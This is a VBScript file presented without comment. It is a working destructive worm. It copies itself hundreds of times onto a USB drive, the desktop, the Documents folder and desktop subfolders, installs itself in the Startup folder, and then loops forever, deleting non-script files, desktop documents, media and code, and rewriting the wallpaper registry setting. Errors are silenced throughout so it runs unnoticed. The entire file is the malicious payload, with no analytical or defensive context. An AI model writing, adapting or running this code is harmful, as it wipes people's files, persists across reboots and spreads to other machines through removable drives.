Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

' Specify the number of copies to create
numCopies = 999

' Specify the path to the USB drive
usbDrivePath = "F:\"

' Generate copies of the script on the USB drive
On Error Resume Next ' Ignore errors
For i = 1 To numCopies
    randomIteration = Int((1000 * Rnd) + 1)
    strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
Next
On Error GoTo 0 ' Reset error handling

' Create copies of the script on the desktop and in the documents folder
On Error Resume Next ' Ignore errors
For i = 1 To numCopies
    randomIteration = Int((1000 * Rnd) + 1)

    ' Create a copy of the script on the desktop
    strDesktopCopyPath = objShell.SpecialFolders("Desktop") & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files

    ' Create a copy of the script in the documents folder
    strDocumentsCopyPath = objShell.SpecialFolders("MyDocuments") & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
Next
On Error GoTo 0 ' Reset error handling

' Add the script to the startup folder
On Error Resume Next ' Ignore errors
startupFolder = objShell.SpecialFolders("Startup")
objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
On Error GoTo 0 ' Reset error handling

' Loop indefinitely
Do
    ' Delete all files except VBS files within the specified folders
    For Each folderPath In foldersToDelete
        DeleteFilesExceptVBS folderPath
    Next

    ' Delete files except VBS files on the USB drive
    On Error Resume Next ' Ignore errors
    For Each usbFile In objFSO.GetFolder(usbDrivePath).Files
        Dim extension
        extension = LCase(objFSO.GetExtensionName(usbFile.Path))
        If extension <> "vbs" Then
            objFSO.DeleteFile usbFile.Path
        End If
    Next
    On Error GoTo 0 ' Reset error handling

    ' Set wallpaper
    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
    
    ' Loop through each file in the Desktop folder and delete if it has a specified file extension
    For Each desktopFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
        Dim desktopExtension
        desktopExtension = LCase(objFSO.GetExtensionName(desktopFile.Name))
        If desktopExtension = "txt" Or desktopExtension = "exe" Or desktopExtension = "json" Or desktopExtension = "doc" Or desktopExtension = "pdf" Or desktopExtension = "wpd" Or desktopExtension = "docx" Or desktopExtension = "rtf" Or desktopExtension = "tex" Or desktopExtension = "odt" Or desktopExtension = "jpg" Or desktopExtension = "jpeg" Or desktopExtension = "mp3" Or desktopExtension = "rar" Or desktopExtension = "vcd" Or desktopExtension = "webp" Or desktopExtension = "css" Or desktopExtension = "html" Or desktopExtension = "py" Or desktopExtension = "php" Or desktopExtension = "ico" Or desktopExtension = "lnk" Or desktopExtension = "mp4" Or desktopExtension = "js" Or desktopExtension = "bak" Or desktopExtension = "xml" Or desktopExtension = "zip" Or desktopExtension = "bmp" Then
            objFSO.DeleteFile(desktopFile.Path)
        End If
    Next

    ' Loop through each folder on the Desktop and delete files within them
    For Each desktopFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
        On Error Resume Next ' Ignore errors
        For Each desktopFile In desktopFolder.Files
            objFSO.DeleteFile(desktopFile.Path)
        Next
        On Error GoTo 0 ' Reset error handling
    Next

    ' Generate copies of the script within each folder on the Desktop
    For Each desktopFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
        On Error Resume Next ' Ignore errors
        For i = 1 To numCopies
            randomIteration = Int((1000 * Rnd) + 1)
            strCopyPath = desktopFolder.Path & "\Copy" & randomIteration & ".vbs"
            objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
        Next
        On Error GoTo 0 ' Reset error handling
    Next

Loop

Sub DeleteFilesExceptVBS(folderPath)
    On Error Resume Next

    Set folder = objFSO.GetFolder(folderPath)
    If Err.Number = 0 Then
        For Each file In folder.Files
            Dim extension
            extension = LCase(objFSO.GetExtensionName(file.Path))
            If extension <> "vbs" Then
                objFSO.DeleteFile file.Path
            End If
        Next

        ' Recursively delete files in subfolders
        For Each subfolder In folder.Subfolders
            DeleteFilesExceptVBS subfolder.Path
        Next
    End If

    On Error GoTo 0
End Sub
